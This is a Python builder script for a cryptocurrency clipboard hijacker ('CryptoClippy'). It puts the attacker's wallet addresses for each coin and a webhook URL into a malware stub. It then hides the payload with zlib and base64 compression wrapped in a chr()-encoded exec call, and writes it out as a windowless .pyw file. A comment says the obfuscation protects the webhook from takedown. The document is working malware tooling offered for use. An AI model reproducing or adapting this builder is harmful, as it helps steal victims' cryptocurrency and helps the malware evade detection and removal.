import os
import json
import re
import shutil
import subprocess
import zlib
import base64

shutil.rmtree('temp', ignore_errors=True)
os.mkdir('temp')

with open('src\\stub.py', 'r', encoding='utf-8') as f:
    stub = f.read()

with open('config.json', 'r', encoding='utf-8') as f:
    config = dict(json.load(f))

for coin, address in config.items():
    stub = re.sub(rf'\|{coin}\|?', f'{address}', stub)

hook_value = config['WebHook']
stub = re.sub(r"hook\s*=\s*''", f"hook = '{hook_value}'", stub)
stubcode = stub

stub = re.sub(
    r"thecode\s*=\s*'''.*?'''",
    f"thecode = '''{stubcode.replace("'''", r"\'\'\'")}'''",
    stub,
    flags=re.DOTALL
)

# This just makes the code not as readable if you dont trust this code just remove the two lines below and it will work fine you will just be vonurable to ur webhook getting deleted easier
encoded = base64.b64encode(zlib.compress(stub.encode('utf-8'))).decode()
stub = f'''getattr(__import__(chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)), ''.join(map(chr, [101,120,101,99])))(getattr(__import__(chr(122)+chr(108)+chr(105)+chr(98)), ''.join(map(chr, [100,101,99,111,109,112,114,101,115,115])))(getattr(__import__(chr(98)+chr(97)+chr(115)+chr(101)+chr(54)+chr(52)), ''.join(map(chr, [98,54,52,100,101,99,111,100,101])))(b'{encoded}')))'''

with open('temp\\CryptoClippy.pyw', 'w', encoding='utf-8') as f:
    f.write(stub)

subprocess.run(['explorer', os.path.abspath('temp')])